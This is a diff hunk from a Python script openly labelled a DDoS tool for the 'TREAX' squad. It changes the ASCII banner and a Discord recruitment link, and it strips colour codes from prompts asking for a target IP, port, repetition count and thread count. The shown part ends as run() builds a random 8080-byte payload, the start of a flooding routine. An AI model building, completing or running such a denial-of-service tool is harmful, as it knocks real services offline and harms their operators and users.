@@ -6,22 +6,22 @@ import os
 import codecs, sys
 
 os.system("clear ") 
-print('''\033[93m 
-████████╗██████╗░███████╗░█████╗░██╗░░██╗
-╚══██╔══╝██╔══██╗██╔════╝██╔══██╗╚██╗██╔╝
-░░░██║░░░██████╔╝█████╗░░███████║░╚███╔╝░
-░░░██║░░░██╔══██╗██╔══╝░░██╔══██║░██╔██╗░
-░░░██║░░░██║░░██║███████╗██║░░██║██╔╝╚██╗
-░░░╚═╝░░░╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝╚═╝░░╚═╝ \033[93m''')
-print(" DDoS Tools For My Squad : TREAX ") 
-print(" Join to my squad discord link ")
-print(" TREAX SQUAD : https://discord.gg/ScPy4SMc ") 
+
+print("\033[93m ████████╗██████╗░███████╗░█████╗░██╗░░██╗ \033[93m") 
+print("\033[93m ╚══██╔══╝██╔══██╗██╔════╝██╔══██╗╚██╗██╔╝ \033[93m")
+print("\033[93m ░░░██║░░░██████╔╝█████╗░░███████║░╚███╔╝░ \033[93m") 
+print("\033[94m ░░░██║░░░██╔══██╗██╔══╝░░██╔══██║░██╔██╗░ \033[94m") 
+print("\033[94m ░░░██║░░░██║░░██║███████╗██║░░██║██╔╝╚██╗ \033[94m") 
+print("\033[94m ░░░╚═╝░░░╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝╚═╝░░╚═╝ \033[94m") 
+print("DDoS Tools For My Squad : TREAX ") 
+print("Join to my squad discord link ")
+print("TREAX SQUAD : https://discord.gg/ScPy4SMc ") 
     
-ip = str(input("\033[94  IP Target :\033[94"))
-port = int(input("\033[94 PORT Target :\033[94"))
-choice = str(input("\033[94 Are You Seriously? (y/n) :\033[94"))
-times = int(input("\033[94 Times :\033[94"))
-threads = int(input("\033[94 Threads :\033[94"))
+ip = str(input("  IP Target :"))
+port = int(input(" PORT Target :"))
+choice = str(input(" Are You Seriously? (y/n) :"))
+times = int(input(" Times :"))
+threads = int(input(" Threads :"))
 def run():
 	data = random._urandom(8080)
 	i = random.choice(("[+]","[-]","[=]"))
